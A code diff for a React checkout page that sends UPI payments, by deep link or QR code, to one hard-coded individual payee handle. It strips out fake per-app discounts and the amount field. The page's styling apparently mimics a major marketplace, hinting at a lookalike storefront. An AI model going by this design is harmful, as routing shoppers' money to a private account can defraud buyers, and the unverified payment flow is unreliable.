@@ -16,35 +16,17 @@ function isMobile(): boolean {
     return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
 }
 
-/** Per-method discount config */
-const METHOD_CONFIG: Record<string, { scheme: string; discount: number }> = {
-    'PhonePe': { scheme: 'phonepe://native', discount: 2 },
-    'Google Pay': { scheme: 'tez://upi/pay', discount: 1 },
-    'Paytm': { scheme: 'paytmmp://cash_wallet', discount: 1 },
-    'Other UPI': { scheme: 'upi://pay', discount: 0 },
-};
-
-/** Build standard UPI params WITH amount */
-function buildUpiParams(orderId: string, amount: number): string {
-    return `pa=paytm.s1x1vd6@pty&pn=Anil%20Kumar&am=${amount}&cu=INR&tn=${orderId}`;
+/** Builds the UPI params WITHOUT the `am` field so the amount is editable inside the app */
+function buildUpiParams(orderId: string): string {
+    return `pa=paytm.s1x1vd6@pty&pn=Anil%20Kumar&cu=INR&tn=${orderId}`;
 }
 
-/** Build the launch URL for a given method */
-function buildLaunchUrl(method: string, params: string, amountPaise: number, orderId: string): string {
-    const cfg = METHOD_CONFIG[method] ?? METHOD_CONFIG['Other UPI'];
-
-    if (method === 'PhonePe') {
-        // PhonePe native deep-link with Base64-encoded JSON payload
-        const payload = JSON.stringify({
-            vpa: 'paytm.s1x1vd6@pty',
-            note: orderId,
-            am: String(amountPaise), // paise
-        });
-        const encoded = btoa(payload);
-        return `${cfg.scheme}?payload=${encoded}`;
-    }
-
-    return `${cfg.scheme}?${params}`;
+/** App-specific intent scheme */
+function appScheme(method: string, params: string): string {
+    if (method === 'PhonePe') return `phonepe://pay?${params}`;
+    if (method === 'Google Pay') return `tez://upi/pay?${params}`;
+    if (method === 'Paytm') return `paytmmp://pay?${params}`;
+    return `upi://pay?${params}`;
 }
 
 export default function PaymentPage() {
@@ -52,32 +34,33 @@ export default function PaymentPage() {
     const { cartTotal, paymentMethod, setPaymentMethod, clearCart, cartCount } = useCart();
     const [success, setSuccess] = useState(false);
     const [qrValue, setQrValue] = useState<string | null>(null);
-    const [mobile, setMobile] = useState(true);
+    const [mobile, setMobile] = useState(true); // assume mobile until confirmed
 
-    useEffect(() => { setMobile(isMobile()); }, []);
-
-    // Derive the final payable amount based on selected method's discount
-    const discountPct = METHOD_CONFIG[paymentMethod]?.discount ?? 0;
-    const payableAmount = Math.round(cartTotal * (1 - discountPct / 100));
-    const amountPaise = payableAmount * 100; // for PhonePe payload
+    useEffect(() => {
+        setMobile(isMobile());
+    }, []);
 
     const handlePay = () => {
         const orderId = "ORDER_" + Date.now();
-        const params = buildUpiParams(orderId, payableAmount);
+        const params = buildUpiParams(orderId);
         const genericUrl = `upi://pay?${params}`;
 
         if (!mobile) {
+            // Desktop: show QR code instead of deep link
             setQrValue(genericUrl);
             return;
         }
 
-        const specificUrl = buildLaunchUrl(paymentMethod, params, amountPaise, orderId);
+        // Mobile: try app-specific intent, fall back to generic UPI after 1.5s
+        const specificUrl = appScheme(paymentMethod, params);
 
-        // Set 1.5s fallback to generic UPI if app doesn't open
+        // Only do fallback if it's NOT already the generic scheme
         if (specificUrl !== genericUrl) {
             const fallbackTimer = setTimeout(() => {
                 window.location.href = genericUrl;
             }, 1500);
+
+            // If the page hides (app opened), cancel the fallback
             const handleVisibilityChange = () => {
                 if (document.hidden) {
                     clearTimeout(fallbackTimer);
@@ -107,10 +90,10 @@ export default function PaymentPage() {
     }
 
     const upiOptions = [
-        { id: 'phonepe', name: 'PhonePe', icon: phonepeImg, discount: 2 },
-        { id: 'paytm', name: 'Paytm', icon: paytmImg, discount: 1 },
-        { id: 'gpay', name: 'Google Pay', icon: gpayImg, discount: 1 },
-        { id: 'other', name: 'Other UPI', icon: otherUpiImg, discount: 0 },
+        { id: 'phonepe', name: 'PhonePe', icon: phonepeImg },
+        { id: 'paytm', name: 'Paytm', icon: paytmImg },
+        { id: 'gpay', name: 'Google Pay', icon: gpayImg },
+        { id: 'other', name: 'Other UPI', icon: otherUpiImg },
     ];
 
     return (
@@ -133,17 +116,11 @@ export default function PaymentPage() {
             </div>
 
             {/* Price Breakdown */}
-            <div className="bg-[#f5f7fa] px-4 py-4 border-b border-gray-200">
+            <div className="bg-[#f5f7fa] px-4 py-4 border-b border-gray-200 relative overflow-hidden">
                 <div className="flex justify-between items-center text-[15px] text-gray-700 mb-2">
                     <span>Price ({cartCount} items)</span>
                     <span className="font-medium text-gray-900">₹{cartTotal.toLocaleString()}</span>
                 </div>
-                {discountPct > 0 && (
-                    <div className="flex justify-between items-center text-[15px] text-[#388e3c] mb-2">
-                        <span>{paymentMethod} Discount ({discountPct}%)</span>
-                        <span className="font-medium">− ₹{(cartTotal - payableAmount).toLocaleString()}</span>
-                    </div>
-                )}
                 <div className="flex justify-between items-center text-[15px] text-gray-700 mb-4">
                     <span>Protect Promise Fee</span>
                     <span className="font-medium text-gray-900">₹0</span>
@@ -151,11 +128,11 @@ export default function PaymentPage() {
 
                 <div className="border-t border-dashed border-gray-300 my-3"></div>
 
-                <div className="flex justify-between items-center">
+                <div className="flex justify-between items-center bg-[#f5f7fa]">
                     <div className="flex items-center text-[#2874f0] font-medium text-[16px]">
                         Total Amount <ChevronUp className="w-4 h-4 ml-1" strokeWidth={2.5} />
                     </div>
-                    <span className="font-bold text-[#2874f0] text-[16px]">₹{payableAmount.toLocaleString()}</span>
+                    <span className="font-medium text-[#2874f0] text-[16px]">₹{cartTotal.toLocaleString()}</span>
                 </div>
             </div>
 
@@ -188,18 +165,13 @@ export default function PaymentPage() {
                         <label
                             key={opt.id}
                             onClick={() => { setPaymentMethod(opt.name); setQrValue(null); }}
-                            className={`flex items-center justify-between py-3 px-4 cursor-pointer transition-colors ${paymentMethod === opt.name ? 'bg-blue-50' : 'hover:bg-gray-50'}`}
+                            className="flex items-center justify-between py-3 px-4 cursor-pointer hover:bg-gray-50 transition-colors"
                         >
                             <div className="flex items-center">
                                 <div className="flex items-center justify-center mr-4">
                                     <img src={opt.icon.src} alt={opt.name} className="w-[32px] h-[32px] object-contain" />
                                 </div>
-                                <div className="flex flex-col">
-                                    <span className={`text-[15px] ${paymentMethod === opt.name ? 'text-black font-medium' : 'text-gray-800'}`}>{opt.name}</span>
-                                    {opt.discount > 0 && (
-                                        <span className="text-[11px] text-[#388e3c] font-medium">{opt.discount}% extra discount</span>
-                                    )}
-                                </div>
+                                <span className={`text-[15px] ${paymentMethod === opt.name ? 'text-black font-medium' : 'text-gray-800'}`}>{opt.name}</span>
                             </div>
                             <div className={`w-[18px] h-[18px] rounded-full border-[1.5px] flex items-center justify-center ${paymentMethod === opt.name ? 'border-[#2874f0]' : 'border-gray-400'}`}>
                                 {paymentMethod === opt.name && <div className="w-2.5 h-2.5 bg-[#2874f0] rounded-full"></div>}
@@ -228,15 +200,10 @@ export default function PaymentPage() {
                                 onClick={handlePay}
                                 className="w-full bg-gradient-to-b from-[#ffcf40] to-[#ffc200] text-black font-bold py-3.5 rounded-sm shadow-[0_1px_2px_rgba(0,0,0,0.2)] text-[16px]"
                             >
-                                PAY ₹{payableAmount.toLocaleString()}
+                                PAY ₹{cartTotal.toLocaleString()}
                             </button>
-                            {discountPct > 0 && (
-                                <p className="text-center text-[11px] text-[#388e3c] mt-1.5 font-medium">
-                                    You save ₹{(cartTotal - payableAmount).toLocaleString()} with {paymentMethod}!
-                                </p>
-                            )}
                             {!mobile && (
-                                <p className="text-center text-[11px] text-gray-400 mt-1">A QR code will appear for desktop payment</p>
+                                <p className="text-center text-[11px] text-gray-400 mt-2">A QR code will appear for desktop payment</p>
                             )}
                         </div>
                     )}
